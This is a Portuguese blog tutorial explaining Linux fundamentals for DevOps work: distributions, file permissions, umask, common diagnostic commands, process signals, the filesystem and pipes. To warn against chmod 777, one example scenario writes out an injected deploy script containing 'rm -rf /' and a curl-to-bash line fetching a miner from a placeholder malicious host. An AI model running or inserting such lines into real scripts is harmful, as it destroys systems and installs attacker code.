---
title: "Entendendo um pouco de Linux"
date: "2025-10-03"
tags: ["DEVOPS", "LINUX"]
description: "O que eu queria que tivessem me ensinado sobre Linux"
---

# O que eu queria que tivessem me ensinado sobre Linux

---

<p align="center">
  <img src="/images/linux/root.jpg" />
</p>

---

## A jornada de quem não sabe por onde começar

Quando comecei a me aprofundar no mundo de Linux, me sentia completamente perdido. O terminal era aquela tela preta intimidadora, cheia de comandos que pareciam escritos em alienígena. Não entendia o que eram distribuições, por que existiam tantas, nem por que diabos todo mundo na área de tecnologia falava sobre isso com tanto entusiasmo — ou terror.

Mas conforme fui tendo mais contato com o sistema, algo mudou. Percebi que Linux não é apenas um sistema operacional: é uma ferramenta versátil, poderosa e que te dá controle total sobre a máquina (inclusive o poder de apagar todo o seu Sistema Operacional com um comando errado — mas calma, vamos evitar isso).

Com o tempo, padrões começaram a fazer sentido. Comandos começaram a ficar enraizados na memória. Você sabe como é: naturalmente no trabalho você acaba precisando usar um `| grep arquivo37482.log` ou dar aquele `tail -f` em um log de produção. Você vai executando, vai resolvendo problemas, e de repente está lidando com servidores, containers e pipelines de CI/CD.

Mas aqui está a verdade que ninguém fala: **executar comandos não é entender Linux de fato**. A diferença entre decorar `ls -la` e compreender o filesystem Unix é brutal — especialmente quando você está debugando um container quebrado ou uma aplicação em produção às 1:39h da manhã, com o chefe te mandando mensagem no Slack perguntando "já resolveu?".

Este guia é o que eu gostaria que alguém tivesse me ensinado quando comecei. Não é um tutorial de comandos para decorar. É sobre entender **por que** as coisas funcionam do jeito que funcionam, e **como** usar esse conhecimento para resolver problemas reais.

---

## Distribuições não são apenas sabores diferentes

### O que são distribuições afinal?

Antes de falar sobre distribuições, vamos entender o básico: **Linux é só o kernel**. É o núcleo do sistema operacional, a parte que conversa diretamente com o hardware da sua máquina. Sozinho, o kernel não faz muita coisa. Você precisa de ferramentas, aplicações, interfaces gráficas e gerenciadores de pacotes para ter um sistema funcional.

É aí que entram as **distribuições Linux** (ou "distros"). Uma distribuição pega o kernel Linux e empacota junto com um conjunto de softwares, ferramentas, configurações padrão e filosofias de uso. Pense nas distribuições como versões customizadas do Linux, cada uma focada em necessidades específicas.

Quando eu comecei, achava que a diferença entre Ubuntu e Debian era só a cor da logo. Grande erro. Cada distro carrega filosofias distintas, públicos-alvo diferentes e decisões técnicas que impactam diretamente no seu trabalho.

### Conhecendo as principais distribuições

Vamos pegar algumas das distribuições mais famosas e entender suas diferenças:

```markdown
| Distribuição | Base          | Público-alvo                    | Filosofia                           |
|--------------|---------------|---------------------------------|-------------------------------------|
| Debian       | Independente  | Servidores, estabilidade        | Software livre, testado e estável   |
| Arch         | Independente  | Usuários avançados, entusiastas | Simplicidade, controle total        |
| Mint         | Ubuntu/Debian | Iniciantes, desktop amigável    | Facilidade de uso, out-of-the-box   |
| Ubuntu       | Debian        | Desktop e servidores            | Facilidade + ecossistema comercial  |
| Pop! OS      | Ubuntu        | Criadores, gamers, devs         | Performance, drivers otimizados     |
| Alpine       | Independente  | Containers, minimalistas        | Leveza extrema, segurança           |
```

### Por que isso importa no mundo real?

Imagine que você precisa escolher uma distribuição para rodar seus containers Docker em produção. Sua escolha vai impactar:

- **Tamanho da imagem**: Alpine gera imagens de ~5MB contra ~150MB do Ubuntu
- **Segurança**: Menos pacotes = menor superfície de ataque
- **Compatibilidade**: Algumas bibliotecas podem não funcionar em Alpine (que usa musl em vez de glibc)
- **Atualização**: Como você vai manter o sistema atualizado? Via `apt`, `apk`, `yum`?

**Debian** é a base de aproximadamente 80% dos servidores cloud que você vai operar. Por quê? Estabilidade comprovada, vasta documentação e um sistema de pacotes (`apt` e `dpkg`) extremamente maduro. Entender o ecossistema Debian não é opcional — é fundamental.

### Perguntas que você precisa saber responder

Se você está trabalhando com Linux profissionalmente, precisa estar preparado para perguntas como:

**1. Qual distro usar para construir imagens Docker mínimas?**
   - Resposta curta: Alpine Linux
   - Por quê: Imagens menores significam deploys mais rápidos, menos consumo de rede e menor superfície de ataque

**2. Como atualizar pacotes na minha distro?**
   - Debian/Ubuntu: `apt update && apt upgrade`
   - Alpine: `apk update && apk upgrade`
   - CentOS/RHEL: `yum update` ou `dnf update`

**3. O que é esse diretório `/etc/apt/sources.list.d/` e por que o `apt update` mexe nisso?**
   - É onde ficam os repositórios de pacotes
   - Quando você roda `apt update`, o sistema consulta esses repositórios para saber quais pacotes estão disponíveis e suas versões
   - Entender isso é crucial para resolver problemas de dependências ou adicionar repositórios personalizados

**4. Preciso de interface gráfica? GNOME, XFCE ou KDE?**
   - Em servidores: **NÃO**. Interface gráfica consome recursos desnecessários
   - Em desktops: Depende do hardware e preferência pessoal
   - GNOME: moderno mas pesado | XFCE: leve e funcional | KDE: customizável

### Exemplo prático: Dockerfile otimizado

Veja como a escolha da distro impacta na prática:

```dockerfile
# Usando Alpine Linux como base
FROM python:3.14-alpine

WORKDIR /code

# Variáveis de ambiente para Flask
ENV FLASK_APP=app.py
ENV FLASK_RUN_HOST=0.0.0.0

# Instalar dependências de compilação necessárias
# apk é o gerenciador de pacotes do Alpine
RUN apk add --no-cache gcc musl-dev linux-headers

# Copiar e instalar dependências Python
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt

EXPOSE 5000

COPY . .

CMD ["flask", "run", "--debug"]
```

Esse `-alpine` no nome da imagem não está ali de enfeite. Significa que você está usando Python 3.14 rodando sobre Alpine Linux. O resultado? Uma imagem Docker que pode ter menos de 50MB contra facilmente 1GB+ com Ubuntu completo.

**Por que isso importa?**
- Deploy mais rápido (menos dados para transferir)
- Menos vulnerabilidades (menos pacotes instalados)
- Menor custo de armazenamento em registries
- Startup mais rápido dos containers

---

## Permissões não são apenas chmod 777

### O erro que todo iniciante comete

Um dos erros clássicos que cometi — e que vejo CONSTANTEMENTE iniciantes cometendo — foi dar pouca importância para permissões. Afinal, é só dar um `chmod 777` e tudo funciona, certo?

**ERRADO. Muito errado.**

Essa é a mentalidade que leva a brechas de segurança gigantescas. Em DevSecOps, o modelo de permissões Unix é seu **primeiro mecanismo de defesa**, e ele é EXTREMAMENTE importante. Ignorar permissões é como deixar a porta da sua casa aberta com um letreiro "PODE ENTRAR".

### Entendendo o básico das permissões

Quando você executa `ls -l` (a flag `-l` significa "long format", ou seja, formato longo com detalhes), você vê algo assim:

```bash
-rw-r----- 1 root root 696969 out 24 2024 arquivo_aleatorio.pdf
```

Parece confuso? Vamos decompor cada parte:

```bash
-rw-r----- root root   696969 out 24  2024  arquivo_aleatorio.pdf
│ │ │  │   │    │      │      │             │
│ │ │  │   │    │      │      │             └─ Nome do arquivo
│ │ │  │   │    │      │      └──────── Data de modificação
│ │ │  │   │    │      └─────────────── Tamanho em bytes
│ │ │  │   │    └──────────────────── Grupo dono
│ │ │  │   └───────────────────────── Usuário dono
│ │ │  └─────────────────────────── Outros (others): sem permissões
│ │ └───────────────────────────── Grupo (group): só leitura
│ └─────────────────────────────── Usuário (owner): leitura + escrita
└─────────────────────────────── Diretório (d) ou arquivo (-)
```

O primeiro caractere indica o **tipo**:
- `-` = arquivo regular
- `d` = diretório (directory)
- `l` = link simbólico
- `b` = dispositivo de bloco
- `c` = dispositivo de caractere

Os próximos 9 caracteres são divididos em **três grupos de três**:

1. **rwx** → Permissões do dono (owner/user)
2. **rwx** → Permissões do grupo (group)
3. **rwx** → Permissões de outros (others/world)

Onde:
- **r** (read) = leitura
- **w** (write) = escrita
- **x** (execute) = execução

Se um traço `-` aparece no lugar, significa que aquela permissão está **desabilitada**.

### Alterando permissões na prática

Existem duas formas de usar `chmod`: **simbólica** e **numérica**.

**Forma simbólica (mais clara para iniciantes):**

```bash
# Dá permissão total ao dono, leitura+execução ao grupo, nada para outros
chmod u=rwx,g=rx,o= arquivo_aleatorio.pdf
```

Resultado:
```bash
-rwxr-x--- 1 root root 696969 out 24 2024 arquivo_aleatorio.pdf
```

**Forma numérica (mais rápida quando você domina):**

Cada permissão tem um valor:
- r (read) = 4
- w (write) = 2
- x (execute) = 1

Você soma os valores para cada grupo:
- rwx = 4+2+1 = 7
- r-x = 4+0+1 = 5
- r-- = 4+0+0 = 4
- --- = 0+0+0 = 0

Então `chmod 750 arquivo.txt` significa:
- 7 (rwx) para o dono
- 5 (r-x) para o grupo
- 0 (---) para outros

## Princípios fundamentais de segurança

Agora que você entende a sintaxe, vamos aos princípios que realmente importam:

### 1. Menor privilégio possível (Principle of Least Privilege)

Só dê a cada usuário ou processo **exatamente** o que ele precisa para funcionar. Nem mais, nem menos.

**Exemplo errado:**
```bash
chmod 777 /var/www/html
```

**Por que é errado?**
Qualquer usuário do sistema pode modificar seus arquivos web. Um atacante que conseguir acesso a qualquer conta de usuário pode injetar código malicioso no seu site.

**Exemplo correto:**
```bash
chown -R www-data:www-data /var/www/html
chmod 750 /var/www/html
chmod 640 /var/www/html/*.php
```

Aqui, apenas o usuário `www-data` (que roda o servidor web) pode escrever. O grupo pode ler e executar. Outros não têm acesso algum.

### 2. Segregação de responsabilidades

Quem lê não precisa escrever. Quem executa não precisa modificar.

**Exemplo prático: script de deploy**

```bash
# Script pertence ao usuário de deploy, mas usuário do app só pode executar
chown deploy:developers deploy.sh
chmod 750 deploy.sh
```

Se o aplicativo for comprometido, o atacante não pode modificar o script de deploy (só executá-lo).

### 3. Evite o 777 como se fosse a peste

`chmod 777` é basicamente gritar "HEY, QUALQUER UM PODE FAZER O QUE QUISER AQUI". É equivalente a:
- Deixar a senha do root como "123456"
- Compartilhar suas credenciais AWS publicamente
- Colocar uma placa "ROT 13 SHE GRABHW" na porta da empresa

### Comandos essenciais para dominar

```bash
# Ver permissões atuais
ls -l arquivo.txt

# Alterar permissões
chmod 640 arquivo.txt          # Numérico
chmod u=rw,g=r,o= arquivo.txt  # Simbólico

# Mudar dono e grupo
chown usuario:grupo arquivo.txt

# Mudar apenas o grupo
chgrp developers arquivo.txt

# Aplicar recursivamente em diretórios
chmod -R 750 /opt/app
chown -R appuser:appgroup /opt/app

# Ver máscara padrão de criação
umask

# Auditar arquivos perigosos
find / -type f -perm 777 2>/dev/null
```

### Exemplo prático: Vulnerabilidade real

**Cenário:** Você sobe um script de deploy com `chmod 777 deploy.sh`

**Resultado:** 
1. Um atacante consegue acesso SSH com usuário comum (não root)
2. Ele vê que `deploy.sh` tem permissão 777
3. Ele sobrescreve o script injetando:
   ```bash
   #!/bin/bash
   rm -rf /
   # ou pior: baixa minerador de cripto
   curl http://malicious.com/miner.sh | bash
   ```
4. No próximo deploy automático, o script malicioso executa
5. Game over

**Solução correta:**
```bash
chmod 750 deploy.sh
chown deploy:deploy deploy.sh
```

Agora apenas o usuário `deploy` pode modificar. Se o atacante comprometer outro usuário, ele não consegue alterar o script.

### umask: A configuração que ninguém explica

O `umask` define as **permissões padrão** quando você cria novos arquivos ou diretórios. É um valor que **subtrai** permissões.

**Funcionamento:**
- Arquivos começam com permissão máxima 666 (rw-rw-rw-)
- Diretórios começam com 777 (rwxrwxrwx)
- O umask **remove** permissões dessas bases

**Exemplo:**
```bash
umask 022

# Cria arquivo novo
touch arquivo.txt
ls -l arquivo.txt
# Resultado: -rw-r--r-- (644)
# Cálculo: 666 - 022 = 644

# Cria diretório novo
mkdir pasta
ls -ld pasta
# Resultado: drwxr-xr-x (755)
# Cálculo: 777 - 022 = 755
```

**Para maior segurança:**
```bash
umask 077  # Arquivos: 600 (rw-------), Diretórios: 700 (rwx------)
```

Isso garante que arquivos criados sejam privados por padrão.

---

## Comandos que eu gostaria que tivessem me ensinado

Agora que você entende o contexto de permissões e sistema de arquivos, vamos aos comandos que realmente fazem diferença no dia a dia. Não vou apenas listar comandos — vou mostrar **quando** e **por que** usá-los.

### find — Seu melhor amigo em auditorias e troubleshooting

O `find` é muito mais poderoso do que parece. Não é só para "achar arquivos". É uma ferramenta de auditoria, análise e automação.

**Sintaxe básica:**
```bash
find [onde_procurar] [condições] [ação]
```

**Casos de uso reais:**

```bash
# 1. Encontrar todos os logs do nginx
find /var/log/nginx -name "*.log"

# 2. Achar arquivos perigosos com permissão 777 (auditoria de segurança)
find /var/www -type f -perm 777

# 3. Arquivos modificados nas últimas 24 horas (investigar mudanças suspeitas)
find /etc -type f -mtime -1

# 4. Arquivos maiores que 100MB (identificar o que está enchendo o disco)
find /var -type f -size +100M

# 5. Arquivos pertencentes a um usuário específico
find /home -user joao -type f

# 6. Combinar condições: arquivos .log maiores que 50MB modificados nos últimos 7 dias
find /var/log -name "*.log" -size +50M -mtime -7

# 7. Executar ação em cada arquivo encontrado
find /tmp -type f -name "*.tmp" -delete

# 8. Achar arquivos e executar comando customizado
find /var/www -type f -name "*.php" -exec chmod 644 {} \;
```

**Explicando os argumentos importantes:**
- `-type f` → apenas arquivos regulares
- `-type d` → apenas diretórios
- `-name "*.log"` → por nome (case-sensitive)
- `-iname "*.LOG"` → por nome (case-insensitive)
- `-mtime -7` → modificados nos últimos 7 dias
- `-mtime +30` → modificados há mais de 30 dias
- `-size +100M` → maior que 100MB
- `-perm 777` → com permissão específica
- `-user usuario` → pertencente a um usuário

**Cenário real:** Servidor com disco cheio às 2h da manhã.

```bash
# Encontrar os maiores culpados
find / -type f -size +500M -exec ls -lh {} \; 2>/dev/null

# Limpar logs antigos do Docker
find /var/lib/docker/containers/ -name "*.log" -mtime +30 -delete
```

### grep — Análise de logs e busca de padrões

O `grep` filtra linhas de texto que correspondem a um padrão. É **essencial** para análise de logs.

**Uso básico:**
```bash
# Procurar palavra "ERROR" em um log
grep "ERROR" /var/log/syslog

# Buscar ignorando maiúsculas/minúsculas
grep -i "error" /var/log/syslog

# Mostrar 5 linhas antes e depois do match (contexto)
grep -C 5 "Exception" /var/log/app.log

# Buscar em múltiplos arquivos
grep "CRITICAL" /var/log/*.log

# Contar ocorrências
grep -c "404" /var/log/nginx/access.log

# Inverter busca (mostrar linhas que NÃO têm o padrão)
grep -v "DEBUG" /var/log/app.log
```

**Regex com grep:**
```bash
# Linhas que começam com "ERROR"
grep "^ERROR" /var/log/app.log

# Linhas que terminam com "failed"
grep "failed$" /var/log/app.log

# IPs no log
grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" access.log

# Buscar múltiplos padrões (OR)
grep -E "error|fail|critical" /var/log/syslog

# Buscar padrões complexos
grep -E "(ERROR|FATAL).*database" /var/log/app.log
```

**Cenário real:** Investigar falhas em produção.

```bash
# Pipeline completo de análise
cat /var/log/app.log | \
  grep -i "error" | \                    # Filtrar erros
  grep -v "DeprecationWarning" | \        # Remover warnings conhecidos
  awk '{print $1, $2, $NF}' | \          # Extrair timestamp e última coluna
  sort | uniq -c | sort -rn | head -20   # Contar e rankear
```

### tail — Monitoring em tempo real

O `tail` é fundamental para acompanhar logs de aplicações em execução.

**Comandos essenciais:**
```bash
# Últimas 10 linhas (padrão)
tail arquivo.txt

# Últimas 50 linhas
tail -n 50 arquivo.txt

# Acompanhar em tempo real (MUITO USADO)
tail -f /var/log/syslog

# Seguir arquivo mesmo se ele for recriado (docker logs, por exemplo)
tail -F /var/log/app.log

# Começar da linha X
tail -n +100 arquivo.txt  # Da linha 100 em diante
```

**Pipelines poderosos:**
```bash
# Monitorar apenas erros em tempo real
tail -f /var/log/app.log | grep -i "error"

# Múltiplos padrões
tail -f /var/log/syslog | grep -E "error|fail|critical|fatal"

# Colorir output (requer grep --color)
tail -f /var/log/app.log | grep --color=always -E "ERROR|WARN|$"

# Filtrar e contar em tempo real
tail -f /var/log/nginx/access.log | grep "POST" | wc -l
```

**Cenário real:** Deploy de aplicação em produção.

```bash
# Terminal 1: Logs da aplicação
tail -f /var/log/app/production.log | grep -v "DEBUG"

# Terminal 2: Logs do Nginx
tail -f /var/log/nginx/error.log

# Terminal 3: Logs do sistema
tail -f /var/log/syslog | grep -E "OOM|killed|segfault"
```

### ps e top — Entendendo processos em execução

Todo DevOps chora quando o júnior não sabe usar `ps` e `top`. Esses comandos mostram quais processos estão rodando e consumindo recursos.

**ps (Process Status):**
```bash
# Ver todos os processos (formato longo)
ps aux

# Explicando as colunas:
# USER   PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND
# root  1234  2.5  5.2 456789 98765 ?     Ss   10:30   0:15 /usr/bin/app

# Buscar processo específico
ps aux | grep nginx

# Árvore de processos (mostra relações pai-filho)
ps auxf

# Processos de um usuário específico
ps -u www-data

# Processos ordenados por uso de CPU
ps aux --sort=-%cpu | head -20

# Processos ordenados por uso de memória
ps aux --sort=-%mem | head -20
```

**Colunas importantes:**
- `USER`: quem iniciou o processo
- `PID`: ID único do processo
- `%CPU`: percentual de CPU usado
- `%MEM`: percentual de RAM usado
- `VSZ`: memória virtual total
- `RSS`: memória física real usada
- `STAT`: estado (S=sleeping, R=running, Z=zombie, D=uninterruptible sleep)

**top (monitoramento interativo):**
```bash
# Abrir o top
top

# Comandos dentro do top:
# M → ordenar por memória
# P → ordenar por CPU
# k → matar processo (vai pedir o PID)
# q → sair
# 1 → mostrar CPUs individuais
# h → ajuda
```

**htop (alternativa melhor, se disponível):**
```bash
# Instalar
apt install htop  # Debian/Ubuntu
apk add htop      # Alpine

# Executar
htop

# Interface muito mais amigável e colorida
# F9 → kill processo
# F6 → ordenar por coluna
# / → buscar processo
```

**Cenário real:** Servidor lento, CPU alta.

```bash
# 1. Identificar processos pesados
top
# Apertar 'P' para ordenar por CPU

# 2. Ver detalhes do processo suspeito
ps aux | grep [PID]

# 3. Analisar o que ele está fazendo
lsof -p [PID]  # Ver arquivos abertos
strace -p [PID]  # Ver chamadas de sistema (cuidado, pode deixar mais lento)

# 4. Se necessário, matar processo
kill -15 [PID]  # SIGTERM (tenta fechar graciosamente)
# Se não responder:
kill -9 [PID]   # SIGKILL (mata forçado)
```

### netstat e ss — Análise de conexões de rede

Fundamentais para debugging de problemas de rede e identificar portas em uso.

**ss (substituto moderno do netstat):**
```bash
# Listar todas as portas TCP em listening
ss -tuln

# Explicando as flags:
# -t → TCP
# -u → UDP
# -l → listening (portas esperando conexão)
# -n → números em vez de nomes (ex: 80 em vez de http)
# -p → mostrar processo dono da porta (precisa sudo)

# Ver todas as conexões estabelecidas
ss -tun

# Ver processos donos das portas (como root)
sudo ss -tulnp

# Filtrar por porta específica
ss -tuln | grep :80

# Ver conexões de um IP específico
ss -tun dst 192.168.1.100
```

**netstat (comando legado, mas ainda útil):**
```bash
# Mesma funcionalidade do ss acima
netstat -tulnp

# Ver tabela de roteamento
netstat -r

# Estatísticas de rede
netstat -s
```

**Cenário real:** Aplicação não conecta ao banco de dados.

```bash
# 1. Verificar se o banco está rodando e na porta certa
sudo ss -tulnp | grep 5432  # PostgreSQL

# 2. Testar conexão
telnet localhost 5432

# 3. Verificar se tem firewall bloqueando
sudo iptables -L -n

# 4. Ver se a aplicação consegue conectar
ss -tunp | grep [PID_DA_APP]
```

---

## Processos e sinais — O básico que ninguém explica direito

### O que são sinais?

Em Linux, **sinais** são mensagens que o sistema operacional ou usuários enviam para processos. São como notificações que dizem ao processo "faça isso agora" ou "está na hora de encerrar".

Vou usar uma metáfora porque facilita o entendimento:

Imagine que você está no trabalho e precisa avisar o estagiário que está em outro setor. Você pode:

**SIGTERM** (15) → Puxar o estagiário pelo braço
- "Ei, preciso que você encerre o que está fazendo de forma organizada"
- O processo recebe o aviso, salva dados, fecha conexões, limpa recursos
- É a forma **educada** de pedir para um processo terminar
- **Use sempre SIGTERM primeiro**

**SIGKILL** (9) → Dar três tiros pro alto e ameaçar derrubar o CEO
- "ACABOU! AGORA!"
- O processo **não tem chance** de fazer nada, morre instantaneamente
- Dados não salvos são **perdidos**
- Pode deixar arquivos corrompidos, locks travados, conexões abertas
- **Use apenas quando SIGTERM não funcionar**

**SIGHUP** (1) → Tocar no ombro do estagiário
- "Refaz isso aí, recarrega as configurações"
- Originalmente usado quando um terminal era desconectado
- Hoje usado principalmente para **reload de configs** sem reiniciar o serviço
- Nginx, Apache e muitos daemons usam SIGHUP para recarregar

**SIGSTOP / SIGCONT** (19 / 18) → Apertar pause/play
- "Pausa aí rapidinho... beleza, pode voltar!"
- Literalmente pausa o processo (não pode ser capturado)
- Útil para debugging ou economizar recursos temporariamente

### Sinais na prática

```bash
# Listar todos os sinais disponíveis
kill -l

# Forma educada: tenta encerrar graciosamente
kill -SIGTERM 1234
# ou simplesmente
kill 1234  # SIGTERM é o padrão

# Forma bruta: mata na marra (use com cuidado)
kill -9 1234
# ou
kill -SIGKILL 1234

# Recarregar configurações
kill -SIGHUP 1234

# Pausar processo
kill -SIGSTOP 1234

# Retomar processo pausado
kill -SIGCONT 1234

# Interromper (Ctrl+C)
kill -SIGINT 1234
```

**Diferença crucial entre SIGTERM e SIGKILL:**

```bash
# Cenário: banco de dados PostgreSQL
# SIGTERM (correto)
sudo systemctl stop postgresql
# → PostgreSQL recebe SIGTERM
# → Aguarda transações finalizarem
# → Faz checkpoint dos dados
# → Fecha conexões graciosamente
# → Salva estado
# → Encerra

# SIGKILL (perigoso)
kill -9 $(pgrep postgres)
# → PostgreSQL morre imediatamente
# → Transações são perdidas
# → Possível corrupção de dados
# → Recovery demorado no próximo boot
```

### Containers e sinais

Isso é **FUNDAMENTAL** se você trabalha com Docker/Kubernetes:

```bash
# docker stop (método correto)
docker stop meu-container
# → Envia SIGTERM para o processo principal (PID 1)
# → Aguarda 10 segundos (padrão)
# → Se não morrer, envia SIGKILL

# docker kill (força bruta)
docker kill meu-container
# → Envia SIGKILL imediatamente
# → Processo morre sem aviso
```

**Problema comum:** Aplicação que não trata SIGTERM perde dados.

**Exemplo de aplicação que NÃO trata sinais (ruim):**
```python
# app.py
import time
while True:
    print("Processando...")
    time.sleep(1)
```

Quando você faz `docker stop`, essa aplicação recebe SIGTERM mas ignora (não tem handler). Após timeout, recebe SIGKILL e morre perdendo estado.

**Exemplo correto (tratando sinais):**
```python
# app.py
import signal
import sys
import time

def signal_handler(sig, frame):
    print("Encerrando graciosamente...")
    # Salvar estado, fechar conexões, etc.
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

while True:
    print("Processando...")
    time.sleep(1)
```

Agora a aplicação pode se despedir direito quando receber SIGTERM.

**Kubernetes e sinais:**
```yaml
# deployment.yaml
spec:
  containers:
  - name: app
    lifecycle:
      preStop:
        exec:
          command: ["/bin/sh", "-c", "sleep 15"]  # Dá tempo para graceful shutdown
  terminationGracePeriodSeconds: 30  # Aguarda até 30s antes de SIGKILL
```

---

## Filesystem — Tudo é arquivo

### O conceito fundamental

No Linux, **absolutamente tudo é representado como arquivo**. Isso não é exagero. É o design fundamental do sistema Unix. Processos? Arquivos. Dispositivos de hardware? Arquivos. Conexões de rede? Arquivos. Variáveis de ambiente? Arquivos.

Essa abstração é o que permite você fazer debugging profundo sem precisar de ferramentas mágicas proprietárias. Quer saber o que um processo está fazendo? Leia seus "arquivos" em `/proc/[PID]/`. Quer ver informações da CPU? `cat /proc/cpuinfo`. Quer escrever no disco? Escreva no arquivo `/dev/sda`.

### Não existe C: ou D:

No Windows, você tem `C:\`, `D:\`, etc. No Linux, existe **uma única árvore** que começa em `/` (chamado de "root" ou raiz).

```bash
/                           ← Raiz de tudo
├── bin/                    ← Comandos essenciais do sistema
├── boot/                   ← Arquivos para boot (kernel, GRUB)
├── dev/                    ← Dispositivos (discos, placas, TTY)
├── etc/                    ← Configurações do sistema
├── home/                   ← Diretórios dos usuários
│   ├── joao/
│   └── maria/
├── lib/                    ← Bibliotecas compartilhadas
├── opt/                    ← Software opcional (apps de terceiros)
├── proc/                   ← Informações do kernel e processos (virtual)
├── root/                   ← Home do usuário root
├── run/                    ← Dados runtime (PIDs, sockets)
├── sys/                    ← Interface com kernel (virtual)
├── tmp/                    ← Arquivos temporários (limpo no reboot)
├── usr/                    ← Programas de usuário
│   ├── bin/
│   ├── lib/
│   └── local/
└── var/                    ← Dados variáveis (logs, cache, spool)
    ├── log/
    ├── www/
    └── lib/
```

### Diretórios críticos explicados

**`/` (root)**
- Ponto de montagem principal
- Ferrar aqui = ferrar tudo

**`/bin` e `/usr/bin`**
- Comandos do sistema (`ls`, `cat`, `grep`, etc.)
- `/bin`: essenciais para boot
- `/usr/bin`: comandos de usuário

**`/etc` (et cetera)**
- **TODAS** as configurações do sistema
- Configurações globais de aplicações
- Arquivos críticos como `/etc/passwd`, `/etc/shadow`, `/etc/fstab`
- Errar aqui pode quebrar o boot do sistema

**`/home`**
- Diretório pessoal de cada usuário
- `/home/joao` pertence ao usuário `joao`
- Equivalente ao `C:\Users\joao` do Windows

**`/var` (variable)**
- Dados que mudam frequentemente
- `/var/log`: **TODOS** os logs do sistema
- `/var/www`: arquivos de sites (convenção)
- `/var/lib`: dados persistentes de aplicações

**`/tmp`**
- Arquivos temporários
- **Limpo automaticamente** no reboot
- Qualquer usuário pode escrever aqui (mas com sticky bit)
- Nunca guarde nada importante aqui

**`/proc` e `/sys` (virtuais)**
- Não são arquivos "reais" em disco
- Interface para informações do kernel
- Montados dinamicamente pelo sistema

### /proc — Janela para o kernel

O `/proc` é um **filesystem virtual** que não ocupa espaço em disco. É uma interface que o kernel expõe para você ver informações em tempo real.

```bash
# Informações da CPU
cat /proc/cpuinfo

# Memória disponível
cat /proc/meminfo

# Versão do kernel
cat /proc/version

# Uptime do sistema
cat /proc/uptime

# Processos em execução
ls /proc/
# Cada número é um PID

# Informações de um processo específico
ls -l /proc/1234/
```

**Explorando um processo via /proc:**
```bash
# PID do processo (vamos usar o bash atual)
echo $$
# Exemplo: 5678

# Diretório de trabalho do processo
ls -l /proc/5678/cwd

# Executável do processo
ls -l /proc/5678/exe

# Arquivos abertos pelo processo
ls -l /proc/5678/fd/

# Variáveis de ambiente
cat /proc/5678/environ | tr '\0' '\n'

# Uso de memória
cat /proc/5678/status | grep VmSize

# Argumentos passados ao processo
cat /proc/5678/cmdline | tr '\0' ' '

# Limite de recursos
cat /proc/5678/limits
```

**Caso real de debugging:**
```bash
# Aplicação travada, descobrir o que está fazendo
PID=1234

# Ver arquivos que está acessando
lsof -p $PID

# Ver chamadas de sistema
strace -p $PID

# Ver stack trace (se compilado com símbolos)
pstack $PID  # ou gdb -p $PID

# Ver diretório de trabalho
ls -l /proc/$PID/cwd
```

### /dev — Dispositivos como arquivos

Tudo conectado ao hardware aparece em `/dev`.

```bash
# Discos rígidos
/dev/sda        # Primeiro disco SATA/SCSI
/dev/sda1       # Primeira partição do /dev/sda
/dev/sda2       # Segunda partição
/dev/nvme0n1    # Disco NVMe

# Terminais virtuais
/dev/tty1       # Console virtual 1
/dev/pts/0      # Pseudo-terminal (SSH, tmux)

# Dispositivos especiais
/dev/null       # Buraco negro (descarta tudo)
/dev/zero       # Fonte infinita de zeros
/dev/random     # Gerador de números aleatórios
/dev/urandom    # Gerador mais rápido (menos aleatório)

# Dispositivos de rede (não ficam em /dev, mas...)
ip link show    # Usar comando ip em vez de olhar /dev
```

**Usos práticos:**

```bash
# Descartar output
comando 2>/dev/null  # Joga erros no lixo

# Gerar arquivo com zeros (útil para testes)
dd if=/dev/zero of=arquivo.bin bs=1M count=100  # Arquivo de 100MB

# Gerar senha aleatória
head -c 32 /dev/urandom | base64

# Limpar terminal
cat /dev/null > /dev/tty

# Escrever diretamente em disco (CUIDADO!)
# dd if=imagem.iso of=/dev/sdb  # Cria USB bootável
```

### Montagem de filesystems

Linux **monta** (mount) dispositivos em pontos da árvore.

```bash
# Ver filesystems montados
mount
# ou
df -h  # Mostra uso de disco também

# Montar USB manualmente
mount /dev/sdb1 /mnt/usb

# Desmontar
umount /mnt/usb

# Arquivo que define montagens automáticas
cat /etc/fstab
```

**Exemplo de /etc/fstab:**
```bash
# <dispositivo>  <ponto_montagem>  <tipo>  <opções>  <dump>  <pass>
UUID=abc-123     /                 ext4    defaults  0       1
UUID=def-456     /home             ext4    defaults  0       2
UUID=ghi-789     swap              swap    defaults  0       0
/dev/sdb1        /mnt/backup       ext4    noauto    0       0
```

---

## Pipes e redirecionamento — O superpoder Unix

### A filosofia Unix

Uma das coisas mais poderosas do Linux é a capacidade de **compor** comandos simples para resolver problemas complexos. Isso se chama "filosofia Unix":

> Escreva programas que façam uma coisa e façam bem.  
> Escreva programas que trabalhem juntos.  
> Escreva programas que lidem com streams de texto.

### Redirecionamento básico

```bash
# Redirecionar output para arquivo (sobrescreve)
echo "teste" > arquivo.txt

# Redirecionar output para arquivo (append)
echo "mais texto" >> arquivo.txt

# Redirecionar input de arquivo
sort < lista_desordenada.txt

# Redirecionar stderr (erros)
comando 2> erros.log

# Redirecionar stdout e stderr juntos
comando > tudo.log 2>&1
# ou forma moderna
comando &> tudo.log

# Descartar stderr
comando 2>/dev/null
```

### Pipes — Conectando comandos

O pipe `|` pega a **saída** de um comando e passa como **entrada** do próximo.

```bash
# Exemplo simples
ls -l | grep "txt"

# Pipeline complexo: análise de logs
cat /var/log/nginx/access.log | \
  grep "POST" | \
  awk '{print $1}' | \
  sort | \
  uniq -c | \
  sort -rn | \
  head -10

# Tradução:
# 1. Ler log do nginx
# 2. Filtrar apenas requisições POST
# 3. Extrair o IP (primeira coluna)
# 4. Ordenar IPs
# 5. Contar IPs únicos
# 6. Ordenar por contagem (decrescente)
# 7. Mostrar top 10
```

**Outro exemplo real: encontrar processos pesados**
```bash
ps aux | \
  awk '{print $2, $3, $4, $11}' | \
  sort -k2 -rn | \
  head -10

# Explicação:
# 1. Listar processos
# 2. Extrair: PID, %CPU, %MEM, COMMAND
# 3. Ordenar por %CPU (coluna 2)
# 4. Top 10
```

---

## O que realmente importa

Depois dessa jornada, quero que você entenda o seguinte:

**Linux em DevSecOps não é decorar flags de comandos**. É entender princípios fundamentais:

### 1. Tudo tem contexto de segurança

Quando você executa algo, sempre pergunte:
